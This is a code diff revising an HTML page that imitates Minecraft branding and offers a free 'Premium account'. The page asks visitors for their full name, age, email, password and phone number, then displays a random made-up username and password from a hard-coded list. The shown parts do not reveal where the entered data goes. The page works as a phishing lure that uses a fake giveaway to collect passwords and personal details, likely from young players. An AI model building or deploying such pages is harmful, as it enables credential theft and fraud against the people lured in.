@@ -1,45 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Minecraft Account Free</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background: url('https://i.ibb.co/nNRnH6CX/MCV-Summer-Drop-Hero-Dot-Net-Homepage-1920x1080.jpg') repeat;
-      font-family: 'Segoe UI', Tahoma, sans-serif;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: url("https://i.ibb.co/nNRnH6C/MCV-Summer-Drop-Hero-Dot-Net-Homepage-1920x1080.jpg") no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .header {
       display: flex;
       align-items: center;
+      padding: 20px 40px;
+    }
+
+    .header img {
+      height: 40px;
+    }
+
+    .form-container {
+      display: flex;
       justify-content: center;
-      min-height: 100vh;
+      align-items: center;
+      min-height: calc(100vh - 80px);
+      padding: 20px;
     }
 
     .form-box {
       background-color: rgba(255, 255, 255, 0.95);
       padding: 40px;
       border-radius: 10px;
-      width: 90%;
       max-width: 440px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      width: 100%;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
       text-align: center;
     }
 
-    .form-box img {
-      width: 180px;
-      margin-bottom: 25px;
-    }
-
     h2 {
-      font-weight: normal;
-      color: #222;
+      color: #111;
       margin-bottom: 10px;
     }
 
     p {
-      color: #555;
+      color: #444;
       font-size: 14px;
       margin-bottom: 25px;
     }
@@ -82,19 +90,24 @@
   </style>
 </head>
 <body>
-  <div class="form-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Minecraft_logo.svg" alt="Minecraft">
-    <h2>🎁 Claim Your Minecraft Premium Account</h2>
-    <p>Please provide your real information to verify eligibility.</p>
+  <div class="header">
+    <img src="https://i.ibb.co/jvK8sM0t/Minecraft-Logo-2011.png" alt="Minecraft Logo" />
+  </div>
 
-    <input type="text" id="name" placeholder="Full Name">
-    <input type="number" id="age" placeholder="Age">
-    <input type="email" id="email" placeholder="Email Address">
-    <input type="password" id="password" placeholder="Password">
-    <input type="tel" id="phone" placeholder="Phone Number">
-    <button onclick="claim()">Claim Now</button>
+  <div class="form-container">
+    <div class="form-box">
+      <h2>🎁 Claim Your Minecraft Premium Account</h2>
+      <p>Please provide your real information to verify eligibility.</p>
 
-    <div id="result"></div>
+      <input type="text" id="name" placeholder="Full Name" />
+      <input type="number" id="age" placeholder="Age" />
+      <input type="email" id="email" placeholder="Email Address" />
+      <input type="password" id="password" placeholder="Password" />
+      <input type="tel" id="phone" placeholder="Phone Number" />
+      <button onclick="claim()">Claim Now</button>
+
+      <div id="result"></div>
+    </div>
   </div>
 
   <script>
@@ -112,11 +125,11 @@
       }
 
       const accounts = [
-        "DreamFree2025 | Hunter123",
-        "StevePvP | CreeperKillz",
-        "NotchOG | MojangRocks",
-        "RedstoneGeek | pistonPower",
-        "CraftedX | 123BlockMan"
+        "SteveLegend | Creeper2025",
+        "EpicHero | Pickaxe123",
+        "DiamondHunter | TNTblast!",
+        "RedstoneLord | BuildOP",
+        "HerobrineFree | ghostrunx"
       ];
 
       const rand = accounts[Math.floor(Math.random() * accounts.length)];
